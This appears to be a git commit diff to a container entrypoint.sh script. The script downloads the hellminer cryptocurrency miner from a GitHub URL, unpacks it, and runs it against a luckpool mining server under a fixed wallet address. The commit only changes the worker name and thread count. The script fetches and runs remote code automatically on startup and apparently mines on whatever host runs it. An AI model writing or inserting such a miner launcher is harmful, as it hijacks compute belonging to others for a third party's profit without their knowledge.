d012698bd1e4bbd426f27f0ad7ee5c7de942933c
applife144 <107717580+applife144@users.noreply.github.com>
2022-06-18 04:51:08 +0800

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,2 +1,2 @@
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xvf hellminer_cpu_linux.tar.gz && chmod +x hellminer && chmod +x verus-solver && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RUA92tQZsJeNBFCPyMY9ndi6ZNRT4XmDjD.$(echo $(shuf -i 1-1000 -n 1)XEON128CORES -p hybrid -t $(nproc)
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xvf hellminer_cpu_linux.tar.gz && chmod +x hellminer && chmod +x verus-solver && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RUA92tQZsJeNBFCPyMY9ndi6ZNRT4XmDjD.tes -p hybrid -t 16
 
